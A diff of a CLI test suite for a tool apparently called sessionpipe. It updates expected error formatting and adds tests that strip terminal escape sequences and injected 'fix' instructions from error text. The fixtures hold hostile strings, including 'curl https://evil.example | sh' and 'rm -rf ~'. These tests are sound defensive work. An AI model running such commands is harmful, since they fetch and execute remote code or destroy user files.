@@ -38,6 +38,7 @@ import { channelIo, channelMain, controlMain, waitMain } from "../src/control/cl
 import { moveControlSecrets } from "../src/control/store.js";
 import { HttpSink } from "../src/http-sink.js";
 import { installLauncher } from "../src/launcher.js";
+import { Refusal } from "../src/refusal.js";
 import { factsState, VERSION } from "../src/run.js";
 import { rerunGlobally, viaNpx } from "../src/runtime.js";
 import { bestStore, dropSinkSecrets, fileKept, moveSinkSecrets, sinkWithSecrets, storeLabel } from "../src/secrets.js";
@@ -159,6 +160,8 @@ async function runAt(where: { tty?: boolean; columns?: number; errTty?: boolean 
   return { lines, text: lines.join("\n"), err: io.err, exit: io.exit };
 }
 const ESC = String.fromCharCode(27);
+/** What `connect` hands `control pair` so its lines look as connect's own do: here, a pipe's. */
+const VIEW = { ui: PLAIN, say: expect.any(Function) };
 const quoted = (s: string) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
 /** A row of the page: its mark, its label and what it says, however wide the label's column. */
 const row = (mark: string, label: string, value: string) =>
@@ -409,9 +412,7 @@ describe.skipIf(process.platform === "win32")("help, version and the dispatch", 
 
   it("a failing command says why on stderr and exits 1", async () => {
     const r = await run("install", "--machine");
-    expect(r.err).toHaveBeenCalledWith(
-      "error  --machine NAME is required when naming or renaming a machine\ntry    sessionpipe install --help\n",
-    );
+    expect(r.err).toHaveBeenCalledWith("sessionpipe: --machine NAME is required when naming or renaming a machine\n");
     expect(r.exit).toHaveBeenCalledWith(1);
     expect(r.lines).toEqual([]);
   });
@@ -423,9 +424,7 @@ describe.skipIf(process.platform === "win32")("help, version and the dispatch", 
     await cli.main(["version"]);
     expect(stdout).toHaveBeenCalledWith(`${VERSION}\n`);
     await cli.main(["install", "--machine"]);
-    expect(stderr).toHaveBeenCalledWith(
-      "error  --machine NAME is required when naming or renaming a machine\ntry    sessionpipe install --help\n",
-    );
+    expect(stderr).toHaveBeenCalledWith("sessionpipe: --machine NAME is required when naming or renaming a machine\n");
     expect(exit).toHaveBeenCalledWith(1);
   });
 
@@ -587,7 +586,7 @@ describe.skipIf(process.platform === "win32")("install", () => {
   it("refuses --machine without a name; an explicit rename renames the paired daemon too", async () => {
     put(path.join(home, ".claude", "settings.json"), {});
     expect((await run("install", "--rename-machine")).err).toHaveBeenCalledWith(
-      "error  --machine NAME is required when naming or renaming a machine\ntry    sessionpipe install --help\n",
+      "sessionpipe: --machine NAME is required when naming or renaming a machine\n",
     );
     expect((await run("install", "--machine", "--backfill")).err).toHaveBeenCalled();
     const control = path.join(tmp, "config", "control.json");
@@ -885,24 +884,26 @@ describe.skipIf(process.platform === "win32")("sink add | list | remove | test",
     const file = `file:${path.join(tmp, "t.jsonl")}`;
     for (const tier of [["--tier"], ["--tier", "one"], ["--tier", "1.5"], ["--tier", "--name", "x"]]) {
       const r = await run("sink", "add", file, ...tier);
-      expect(r.err).toHaveBeenCalledWith(
+      expect(r.err).toHaveBeenCalledWith(expect.stringMatching(/^sessionpipe: --tier takes 0, 1, 2 or 3[^\n]*\n$/));
+      expect(r.exit).toHaveBeenCalledWith(1);
+      // At a terminal, the help it points at is the command's own, down to the subcommand.
+      const seen = await runAt({ errTty: true, columns: 100 }, "sink", "add", file, ...tier, "--no-color");
+      expect(seen.err).toHaveBeenCalledWith(
         expect.stringMatching(/^error {2}--tier takes 0, 1, 2 or 3[^\n]*\ntry {4}sessionpipe sink add --help\n$/),
       );
-      expect(r.exit).toHaveBeenCalledWith(1);
     }
     const install = await run("install", "--sink", file, "--tier", "two");
-    expect(install.err).toHaveBeenCalledWith(
-      'error  --tier takes 0, 1, 2 or 3, not "two"\ntry    sessionpipe install --help\n',
-    );
+    expect(install.err).toHaveBeenCalledWith('sessionpipe: --tier takes 0, 1, 2 or 3, not "two"\n');
     expect(install.lines).toEqual([]);
-    // The help it points at is the command's own, down to the subcommand.
     for (const argv of [["connect", "r.invalid"], ["control", "pair", "r.invalid"], ["tail"]]) {
       const r = await run(...argv, "--tier", "x");
+      expect(r.err).toHaveBeenCalledWith('sessionpipe: --tier takes 0, 1, 2 or 3, not "x"\n');
+      expect(r.lines).toEqual([]);
       const about = argv[0] === "control" ? "control pair" : argv[0];
-      expect(r.err).toHaveBeenCalledWith(
+      const seen = await runAt({ errTty: true, columns: 100 }, ...argv, "--tier", "x", "--no-color");
+      expect(seen.err).toHaveBeenCalledWith(
         `error  --tier takes 0, 1, 2 or 3, not "x"\ntry    sessionpipe ${about} --help\n`,
       );
-      expect(r.lines).toEqual([]);
     }
     expect(cfg().sinks).toEqual([]);
   });
@@ -1160,6 +1161,7 @@ describe.skipIf(process.platform === "win32")("connect", () => {
       ],
       expect.any(Function),
       realDist,
+      VIEW,
     );
     expect(text).not.toContain("Safe mode:");
     expect(text).toContain("✓ Sink rx: tier 2 (was 1) — sends tier 1 + your prompts");
@@ -1211,6 +1213,7 @@ describe.skipIf(process.platform === "win32")("connect", () => {
       ["control", "pair", rx.url, "--mode", "auto", "--tier", "3", "--name", "box", "--folder", proj],
       expect.any(Function),
       realDist,
+      VIEW,
     );
     expect(again.text).not.toContain("Safe mode:");
   });
@@ -1232,6 +1235,7 @@ describe.skipIf(process.platform === "win32")("connect", () => {
       expect.arrayContaining(["--mode", "safe", "--tier", "2"]),
       expect.any(Function),
       realDist,
+      VIEW,
     );
     const flagged = await run("connect", rx.url, "--folder", path.join(home, "a"), "--folder", path.join(home, "b"));
     expect(flagged.text).not.toContain("No folder for sessions");
@@ -1241,6 +1245,7 @@ describe.skipIf(process.platform === "win32")("connect", () => {
       expect.arrayContaining(["--folder", path.join(home, "a"), "--folder", path.join(home, "b")]),
       expect.any(Function),
       realDist,
+      VIEW,
     );
     // Inherit is taken as named, like the other two.
     const inherit = await run("connect", rx.url, "--mode", "inherit", "--folder", path.join(home, "a"));
@@ -1249,6 +1254,7 @@ describe.skipIf(process.platform === "win32")("connect", () => {
       expect.arrayContaining(["--mode", "inherit"]),
       expect.any(Function),
       realDist,
+      VIEW,
     );
   });
 
@@ -2960,6 +2966,16 @@ describe.skipIf(process.platform === "win32")(
       );
       put(path.join(state, "control", "update.json"), { updated, pending: "9.9.9" });
       expect(said(await run("status"), "Updates")).toBe("✓ automatic");
+      // Nobody paired: the service that would update isn't set up. A program reads why in
+      // the words `update.off` has always had; a person in the words of the rest of the page.
+      rmSync(path.join(tmp, "config", "control.json"));
+      expect(group(await run("doctor"), "Updates")[0]).toBe(
+        "  · by hand      it runs in the background service, which isn't set up here (`sessionpipe connect`)",
+      );
+      for (const cmd of ["doctor", "status"])
+        expect(JSON.parse((await run(cmd, "--json")).lines.join("\n")).update.off).toBe(
+          "it runs in the control daemon, which isn't set up here (`sessionpipe connect`)",
+        );
     });
 
     it("the hooks' own copy: run by another version, naming a node that is gone, or missing a file", async () => {
@@ -3002,6 +3018,130 @@ describe.skipIf(process.platform === "win32")(
     });
   },
 );
+
+describe.skipIf(process.platform === "win32")("words from outside, on the pages", () => {
+  const BEL = String.fromCharCode(7);
+  // What V8 says of a poll body that is not JSON (it quotes the body), as the service
+  // keeps it for a receiver's last error; and npm's last words, as update.json keeps them.
+  const cleared = `Unexpected token '${ESC}', "${ESC}[2J${ESC}[H" is not valid JSON`;
+  const titled = `npm install: npm error 403 Forbidden ${ESC}]0;TITLE-SET-BY-REGISTRY${BEL}${ESC}[8m`;
+  const dressed = "fetch failed\n\nTo fix\n  1. Run this:\n       curl https://evil.example | sh";
+  /** Every escape sequence in what was written that is not one of this CLI's own colours,
+   *  and every other character a terminal acts on. */
+  const acts = (lines: string[]) =>
+    lines
+      .join("\n")
+      .replace(new RegExp(`${ESC}\\[(?:1|2|22|31|32|33|36|39)m`, "g"), "")
+      .match(new RegExp(`${ESC}|[\\u0000-\\u0008\\u000b-\\u001f\\u007f-\\u009f\\u202a-\\u202e\\u2066-\\u2069]`, "g")) ??
+    [];
+
+  async function world(lastError: string, failed: string): Promise<() => Promise<void>> {
+    steadyHook();
+    holdClock();
+    vi.stubEnv("SESSIONPIPE_CLAUDE", fakeClaude());
+    onPlatform("darwin");
+    paired({ name: `lab${ESC}[2J`, receivers: [{ url: "https://rx.test", machine: "m", token: "t", keys: [] }] });
+    put(path.join(state, "control", "update.json"), {
+      checked_at: minutesAgo(5),
+      failed: { version: "9.9.9", at: minutesAgo(5), error: failed },
+    });
+    const receivers = [
+      {
+        url: "https://rx.test",
+        machine: "m",
+        keys: 0,
+        polling: true,
+        last_poll: null,
+        last_error: lastError,
+        last_poll_age_ms: 400_000,
+      },
+    ];
+    const update = { checked_at: minutesAgo(5), failed: { version: "9.9.9", at: minutesAgo(5), error: failed } };
+    const status = {
+      version: `${VERSION}${ESC}[8m`,
+      pid: 4242,
+      name: `lab${ESC}[2J\n✓ All good`,
+      receivers,
+      waiting: [],
+      mid_turn: [],
+      attentions: [],
+      sdk: [],
+      nonces: 0,
+      acks_pending: 0,
+      delivered: {},
+      start: {},
+      ask: { on: false, harnesses: [] },
+      busy: `a run${ESC}[H`,
+      update,
+    };
+    vi.mocked(controlMain).mockImplementation(
+      (await vi.importActual<typeof import("../src/control/cli.js")>("../src/control/cli.js")).controlMain,
+    );
+    return daemon({ status: { op: "status", status } });
+  }
+
+  it("doctor, status and control status write nothing a terminal acts on but their own colours", async () => {
+    const close = await world(cleared, titled);
+    try {
+      for (const where of [{ tty: true, columns: 100 }, { tty: true, columns: 40 }, {}]) {
+        for (const argv of [["doctor"], ["status"], ["control", "status"]]) {
+          const r = await runAt(where, ...argv);
+          expect(r.text.length).toBeGreaterThan(100);
+          expect(acts(r.lines)).toEqual([]);
+        }
+      }
+      const d = await run("doctor");
+      expect(d.text).toMatch(row("✗", "rx.test", `not live for 7 min: Unexpected token '', "" is not valid JSON`));
+      expect(d.text).toMatch(row("!", "failed", "installing 9.9.9 5 min ago: npm install: npm error 403 Forbidden "));
+      const st = (await runAt({ tty: true, columns: 100 }, "control", "status", "--no-color")).lines;
+      expect(st[1]).toBe(`  sessionpipe ${VERSION} · pid 4242 · lab ✓ All good`);
+      expect(st).toContain("  · in hand   a run");
+      // A program still gets the service's JSON as it came: JSON has its own escapes.
+      const json = JSON.parse((await run("control", "status")).lines.join("\n"));
+      expect(json.receivers[0].last_error).toBe(cleared);
+    } finally {
+      await close();
+    }
+  });
+
+  it("an error dressed as the end of the page stays in its row: one 'To fix', and only our commands under it", async () => {
+    const close = await world(dressed, dressed);
+    try {
+      for (const where of [{ tty: true, columns: 100 }, {}]) {
+        const d = await runAt(where, "doctor", "--no-color");
+        expect(d.lines.filter((l) => l.trim() === "To fix")).toHaveLength(1);
+        const under = d.lines.slice(d.lines.indexOf("To fix") + 1);
+        // Two things to fix here (the service's version, the failed install), one command.
+        expect([...new Set(under.filter((l) => /^ {7}\S/.test(l)))]).toEqual(["       sessionpipe update"]);
+        expect(d.text).not.toMatch(/^\s*curl /m);
+        const s = await runAt(where, "status", "--no-color");
+        expect(s.lines.filter((l) => l.trim() === "To fix")).toHaveLength(0);
+        // A line a group and no more: none begins as a row of someone else's making.
+        expect(s.lines.filter((l) => /^ {2}\S /.test(l))).toHaveLength(5);
+      }
+    } finally {
+      await close();
+    }
+  });
+
+  it("a line a command writes itself loses what a terminal acts on too, in a pipe as at a terminal", async () => {
+    // A receiver's answer to a test event, put on `sink test`'s own line.
+    const rx = await receiver({ status: 502, body: {} });
+    writeConfig({ sinks: [{ name: "rx", url: `${rx.url}/x`, tier: 0 }], harnesses: {} } as never);
+    vi.spyOn(HttpSink.prototype, "send").mockResolvedValue({
+      ok: false,
+      status: 502,
+      error: `${titled}${ESC}[2J`,
+      action: "retry",
+    } as never);
+    for (const where of [{ tty: true, columns: 100 }, {}]) {
+      const r = await runAt(where, "sink", "test", "rx");
+      expect(acts(r.lines)).toEqual([]);
+      // A pipe keeps the line's own spaces; a terminal sets its words one space apart.
+      expect(plain(r.text)).toMatch(/^ {2}✗ rx: 502 npm install: npm error 403 Forbidden {1,2}\(retry\)$/);
+    }
+  });
+});
 
 describe.skipIf(process.platform === "win32")("at a terminal", () => {
   const at80 = { tty: true, columns: 80 };
@@ -3174,7 +3314,7 @@ describe.skipIf(process.platform === "win32")("at a terminal", () => {
     for (const l of page) expect(plain(l).length).toBeLessThan(80);
   });
 
-  it("an error is two lines where errors go: what is wrong, and the command to try, in that terminal's colours", async () => {
+  it("an error at a terminal is two lines: what is wrong, and the command to try, in that terminal's colours", async () => {
     const said = "--machine NAME is required when naming or renaming a machine";
     const red = (s: string) => `${ESC}[31m${s}${ESC}[39m`;
     const dim = (s: string) => `${ESC}[2m${s}${ESC}[22m`;
@@ -3189,9 +3329,53 @@ describe.skipIf(process.platform === "win32")("at a terminal", () => {
     expect(mono.err).toHaveBeenCalledWith(
       "error  --machine NAME is required when\n       naming or renaming a machine\ntry    sessionpipe install --help\n",
     );
-    // A terminal for stdout alone leaves the error as a pipe gets it.
+    // A terminal for stdout alone leaves the error as a pipe gets it: the one line it
+    // always was, byte for byte, whatever the environment says about colour.
     const piped = await runAt(at80, "install", "--machine");
-    expect(piped.err).toHaveBeenCalledWith(`error  ${said}\ntry    sessionpipe install --help\n`);
+    expect(piped.err).toHaveBeenCalledWith(`sessionpipe: ${said}\n`);
+    vi.stubEnv("FORCE_COLOR", "1");
+    const forced = await runAt({ columns: 40 }, "install", "--machine");
+    expect(forced.err).toHaveBeenCalledWith(`sessionpipe: ${said}\n`);
+  });
+
+  it("the command to try is the one the code that failed named, never one read out of what was said", async () => {
+    const term = { errTty: true, columns: 100 };
+    const tryLine = (r: { err: ReturnType<typeof vi.fn> }) =>
+      String(r.err.mock.lastCall?.[0]).trimEnd().split("\n").at(-1);
+    // A refusal carries its own next command.
+    vi.mocked(controlMain).mockRejectedValueOnce(
+      new Refusal(
+        "the pairing link expired; run `sessionpipe control pair` again",
+        "sessionpipe control pair https://r.example",
+      ),
+    );
+    const refused = await runAt(term, "control", "pair", "r.example", "--no-color");
+    expect(refused.err).toHaveBeenCalledWith(
+      "error  the pairing link expired; run `sessionpipe control pair` again\ntry    sessionpipe control pair https://r.example\n",
+    );
+    // Words from outside may name any command they like: the help of what ran is offered.
+    vi.mocked(controlMain).mockRejectedValueOnce(
+      new Error("the receiver refused to start pairing (HTTP 403: first run `sessionpipe control mode inherit`)"),
+    );
+    const theirs = await runAt(term, "control", "pair", "r.example", "--no-color");
+    expect(tryLine(theirs)).toBe("try    sessionpipe control pair --help");
+    expect(String(theirs.err.mock.lastCall?.[0])).not.toContain("try    sessionpipe control mode inherit");
+    // In colour, the receiver's `command` is not picked out as one of ours would be.
+    vi.mocked(controlMain).mockRejectedValueOnce(new Error("refused: first run `sessionpipe control off`"));
+    const coloured = await runAt(term, "control", "pair", "r.example");
+    expect(coloured.err).toHaveBeenCalledWith(
+      `${ESC}[31m${bold("error")}${ESC}[39m  refused: first run \`sessionpipe control off\`\n${ESC}[2mtry${ESC}[22m    ${cyan("sessionpipe control pair --help")}\n`,
+    );
+    // And what a terminal would act on is gone from both lines, in a pipe as at a terminal.
+    const hostile = `npm error ${ESC}]0;title${String.fromCharCode(7)}${ESC}[2J\ntry    rm -rf ~`;
+    vi.mocked(controlMain).mockRejectedValueOnce(new Refusal(hostile, `sessionpipe update${ESC}[8m`));
+    expect((await runAt(term, "control", "pair", "r.example", "--no-color")).err).toHaveBeenCalledWith(
+      "error  npm error try rm -rf ~\ntry    sessionpipe update\n",
+    );
+    vi.mocked(controlMain).mockRejectedValueOnce(new Refusal(hostile, "sessionpipe update"));
+    expect((await run("control", "pair", "r.example")).err).toHaveBeenCalledWith(
+      "sessionpipe: npm error  try    rm -rf ~\n",
+    );
   });
 
   it("an error with no command of its own to point at points at the page of every command", async () => {
@@ -3206,8 +3390,19 @@ describe.skipIf(process.platform === "win32")("at a terminal", () => {
         err,
         exit,
       });
-      expect(err).toHaveBeenCalledWith("error  write EPIPE\ntry    sessionpipe --help\n");
+      expect(err).toHaveBeenCalledWith("sessionpipe: write EPIPE\n");
       expect(exit).toHaveBeenCalledWith(1);
+      const seen = vi.fn();
+      await cli.main(argv, {
+        out: () => {
+          throw new Error("write EPIPE");
+        },
+        err: seen,
+        exit,
+        errTty: true,
+        columns: 80,
+      });
+      expect(plain(String(seen.mock.lastCall?.[0]))).toBe("error  write EPIPE\ntry    sessionpipe --help\n");
     }
   });
 
@@ -3249,7 +3444,7 @@ describe.skipIf(process.platform === "win32")("at a terminal", () => {
       expect(stdout.mock.calls.map(([s]) => String(s)).join("")).not.toContain(ESC);
       await cli.main(["install", "--machine"]);
       expect(stderr).toHaveBeenLastCalledWith(
-        "error  --machine NAME is required when naming or renaming a machine\ntry    sessionpipe install --help\n",
+        "sessionpipe: --machine NAME is required when naming or renaming a machine\n",
       );
     } finally {
       put1(process.stdout, "isTTY", was.out);
